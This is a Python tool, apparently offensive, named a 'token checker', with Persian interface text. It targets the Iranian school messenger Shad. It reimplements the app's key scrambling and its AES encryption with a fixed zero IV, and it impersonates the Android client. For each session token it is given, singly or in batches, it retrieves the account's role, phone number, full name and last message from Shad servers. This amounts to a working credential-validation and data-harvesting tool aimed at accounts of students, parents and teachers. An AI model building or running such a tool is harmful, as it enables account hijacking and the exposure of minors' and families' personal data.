import json
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from typing import Dict, Any

class Hacker:
    
    a = bytes([0] * 16)  # IV ثابت
    
    @staticmethod
    def f(str_key: str) -> bytes:
        if len(str_key) < 32:
            str_key = str_key.ljust(32, '0')
        elif len(str_key) > 32:
            str_key = str_key[:32]
        
        part1 = str_key[0:8]
        part2 = str_key[8:16]
        part3 = str_key[16:24]
        part4 = str_key[24:32]
        
        combined = part3 + part1 + part4 + part2
        
        result_chars = []
        for ch in combined:
            if '0' <= ch <= '9':
                new_digit = ((ord(ch) - 48) + 5) % 10
                result_chars.append(chr(new_digit + 48))
            elif 'a' <= ch <= 'z':
                new_char = ((ord(ch) - 97) + 9) % 26
                result_chars.append(chr(new_char + 97))
            else:
                result_chars.append(ch)
        
        return ''.join(result_chars).encode('utf-8')
    
    @staticmethod
    def d(plain_str: str, key_str: str) -> str:
        try:
            key = Hacker.f(key_str)
            cipher = AES.new(key, AES.MODE_CBC, Hacker.a)
            plain_bytes = plain_str.encode('utf-8')
            padded_bytes = pad(plain_bytes, AES.block_size)
            encrypted = cipher.encrypt(padded_bytes)
            return base64.b64encode(encrypted).decode('utf-8')
        except:
            return None
    
    @staticmethod
    def b(encrypted_str: str, key_str: str) -> str:
        try:
            key = Hacker.f(key_str)
            encrypted_bytes = base64.b64decode(encrypted_str)
            cipher = AES.new(key, AES.MODE_CBC, Hacker.a)
            decrypted = cipher.decrypt(encrypted_bytes)
            unpadded = unpad(decrypted, AES.block_size)
            return unpadded.decode('utf-8')
        except:
            return None


class ShadChecker:
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Shad/3.1.0 (Android)',
            'Content-Type': 'application/json'
        })
    
    def check_token(self, token: str) -> Dict[str, Any]:
        result = {
            "token": token,
            "valid": False,
            "role": "نامشخص",
            "phone": "یافت نشد",
            "name": "یافت نشد",
            "last_login": "یافت نشد",
            "error": None
        }
        
        try:
            print("🔍 بررسی نقش...")
            role_result = self._get_user_roles(token)
            
            if role_result.get("status") == "OK":
                result["valid"] = True
                result["role"] = self._extract_role(role_result)
            else:
                result["error"] = role_result.get("status_det", "توکن نامعتبر")
                return result
            
            print("📞 دریافت شماره...")
            user_result = self._get_user_info(token)
            
            if user_result.get("status") == "OK":
                user_data = self._decrypt_user_data(user_result.get("data_enc", ""), token)
                if user_data:
                    result.update(self._extract_user_info(user_data))
            
            # 3. دریافت آخرین لاگین
            print("📝 دریافت آخرین لاگین...")
            service_result = self._get_service_info(token)
            
            if service_result.get("status") == "OK":
                login_info = self._extract_last_login(service_result, token)
                if login_info:
                    result["last_login"] = login_info
            
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result
    
    def _get_user_roles(self, token: str) -> Dict[str, Any]:
        """دریافت نقش‌های کاربر"""
        payload = {
            "data": {"type": "shad", "barcode": "getroles_v1"},
            "method": "getBarcodeAction",
            "auth": token,
            "client": {
                "app_name": "Main",
                "app_version": "3.1.0",
                "package": "ir.medu.shad",
                "platform": "Android",
                "lang_code": "fa"
            },
            "api_version": "0"
        }
        
        response = self.session.post(
            "https://shbarcode5.iranlms.ir",
            json=payload,
            timeout=10
        )
        
        return response.json() if response.status_code == 200 else {"status": "ERROR"}
    
    def _get_user_info(self, token: str) -> Dict[str, Any]:
        encrypted_data = Hacker.d('{}', token)
        if not encrypted_data:
            return {"status": "ERROR"}
        
        payload = {
            "api_version": "4",
            "auth": token,
            "client": {
                "app_name": "Main",
                "app_version": "3.1.0",
                "lang_code": "fa",
                "package": "ir.medu.shad",
                "platform": "Android"
            },
            "data_enc": encrypted_data,
            "method": "getUserInfo"
        }
        
        response = self.session.post(
            "https://shadmessenger36.iranlms.ir/",
            json=payload,
            timeout=10
        )
        
        return response.json() if response.status_code == 200 else {"status": "ERROR"}
    
    def _get_service_info(self, token: str) -> Dict[str, Any]:
        """دریافت اطلاعات سرویس"""
        encrypted_data = Hacker.d('{"service_guid":"s0B0e8da28a4fde394257f518e64e800"}', token)
        if not encrypted_data:
            return {"status": "ERROR"}
        
        payload = {
            "api_version": "4",
            "auth": token,
            "client": {
                "app_name": "Main",
                "app_version": "3.1.0",
                "lang_code": "fa",
                "package": "ir.medu.shad",
                "platform": "Android"
            },
            "data_enc": encrypted_data,
            "method": "getServiceInfo"
        }
        
        response = self.session.post(
            "https://shadmessenger36.iranlms.ir/",
            json=payload,
            timeout=10
        )
        
        return response.json() if response.status_code == 200 else {"status": "ERROR"}
    
    def _extract_role(self, role_data: Dict[str, Any]) -> str:
        try:
            data = role_data.get("data", {})
            link_data = data.get("link", {})
            link_str = json.dumps(link_data, ensure_ascii=False)
            
            # جستجوی نقش‌های مختلف
            if "(مدیر)" in link_str:
                return "مدیر"
            elif "(معلم)" in link_str:
                return "معلم"
            elif "(دانش آموز)" in link_str:
                return "دانش آموز"
            elif "(اولیا)" in link_str:
                return "اولیا"
            elif "(مربی)" in link_str:
                return "مربی"
            elif "superlink" in link_str:
                # بررسی title برای تشخیص نقش
                title = link_data.get("superlink_data", {}).get("title", "")
                if "مربی" in title:
                    return "مربی"
                elif "معلم" in title:
                    return "معلم"
                elif "مدیر" in title:
                    return "مدیر"
                else:
                    return "کاربر مدرسه"
            else:
                return "کاربر عادی"
        except:
            return "نامشخص"
    
    def _decrypt_user_data(self, encrypted_data: str, token: str) -> Dict[str, Any]:
        try:
            decrypted = Hacker.b(encrypted_data, token)
            return json.loads(decrypted) if decrypted else {}
        except:
            return {}
    
    def _extract_user_info(self, user_data: Dict[str, Any]) -> Dict[str, str]:
        result = {"phone": "یافت نشد", "name": "یافت نشد"}
        
        try:
            user_info = user_data.get("user", {})
            
            # شماره تلفن
            phone = user_info.get("phone", "")
            if phone:
                if phone.startswith("+"):
                    phone = phone.replace("+98", "0")
                result["phone"] = phone
            
            # نام
            first_name = user_info.get("first_name", "")
            last_name = user_info.get("last_name", "")
            if first_name or last_name:
                result["name"] = f"{first_name} {last_name}".strip()
            
        except:
            pass
        
        return result
    
    def _extract_last_login(self, service_data: Dict[str, Any], token: str) -> str:
        try:
            encrypted_data = service_data.get("data_enc", "")
            if not encrypted_data:
                return "یافت نشد"
            
            decrypted = Hacker.b(encrypted_data, token)
            if not decrypted:
                return "یافت نشد"
            
            data = json.loads(decrypted)
            chat_data = data.get("chat", {})
            last_message = chat_data.get("last_message", {})
            
            text = last_message.get("text", "")
            time = last_message.get("time", "")
            
            if text and time:
                return f"{text} (زمان: {time})"
            elif text:
                return text
            else:
                return "لاگی یافت نشد"
                
        except:
            return "خطا در استخراج"


def main():
    print("="*60)
    print("🔐 SHAD TOKEN CHECKER - v2.0")
    print("="*60)
    
    # دریافت توکن
    token = input("\n🔑 لطفا توکن احراز هویت شاد را وارد کنید: ").strip()
    
    if not token:
        print("❌ توکن وارد نشده است!")
        return
    
    print(f"\n{'='*50}")
    print(f"🔍 در حال بررسی توکن: {token[:15]}...")
    print("="*50)
    
    # بررسی توکن
    checker = ShadChecker()
    result = checker.check_token(token)
    
    print("\n" + "="*50)
    print("📊 نتایج بررسی:")
    print("="*50)
    
    print(f"\n✅ وضعیت: {'معتبر' if result['valid'] else 'نامعتبر'}")
    
    if result['error']:
        print(f"❌ خطا: {result['error']}")
        return
    
    print(f"👤 نام: {result['name']}")
    print(f"📞 شماره: {result['phone']}")
    print(f"🎭 نقش: {result['role']}")
    print(f"📝 آخرین لاگین: {result['last_login']}")
    print(f"🔐 توکن: {token[:10]}...{token[-5:] if len(token) > 15 else ''}")
    
    print("\n" + "="*50)


def batch_check():
    """بررسی چند توکن"""
    print("\n" + "="*50)
    print("📊 بررسی چند توکن")
    print("="*50)
    
    tokens_input = input("\n🔑 توکن‌ها را وارد کنید (با ویرگول جدا شوند): ").strip()
    
    if not tokens_input:
        print("❌ هیچ توکنی وارد نشده است!")
        return
    
    tokens = [t.strip() for t in tokens_input.split(",") if t.strip()]
    
    print(f"\n🔍 شروع بررسی {len(tokens)} توکن...")
    print("="*50)
    
    checker = ShadChecker()
    
    for i, token in enumerate(tokens, 1):
        print(f"\n[{i}/{len(tokens)}] توکن: {token[:15]}...")
        result = checker.check_token(token)
        
        if result['valid']:
            print(f"   ✅ معتبر | نقش: {result['role']} | شماره: {result['phone']}")
        else:
            print(f"   ❌ نامعتبر | خطا: {result.get('error', 'ناشناخته')}")


if __name__ == "__main__":
    try:
        # بررسی کتابخانه‌ها
        print("🔍 بررسی کتابخانه‌ها...")
        
        try:
            from Crypto.Cipher import AES
        except ImportError:
            print("❌ pycryptodome نصب نیست!")
            print("💡 دستور نصب: pip install pycryptodome")
            exit(1)
        
        try:
            import requests
        except ImportError:
            print("❌ requests نصب نیست!")
            print("💡 دستور نصب: pip install requests")
            exit(1)
        
        print("✅ همه کتابخانه‌ها نصب شده‌اند\n")
        
        # منوی اصلی
        while True:
            print("="*40)
            print("🏠 منوی اصلی:")
            print("1. 🔍 بررسی یک توکن")
            print("2. 📊 بررسی چند توکن")
            print("3. 🚪 خروج")
            
            choice = input("\n🎯 انتخاب کنید (1-3): ").strip()
            
            if choice == "1":
                main()
            elif choice == "2":
                batch_check()
            elif choice == "3":
                print("\n👋 با تشکر!")
                break
            else:
                print("\n❌ انتخاب نامعتبر!")
            
            if choice in ["1", "2"]:
                input("\n↵ برای ادامه Enter بزنید...")
                
    except KeyboardInterrupt:
        print("\n\n⏹️  برنامه متوقف شد")
    except Exception as e:
        print(f"\n❌ خطا: {e}")
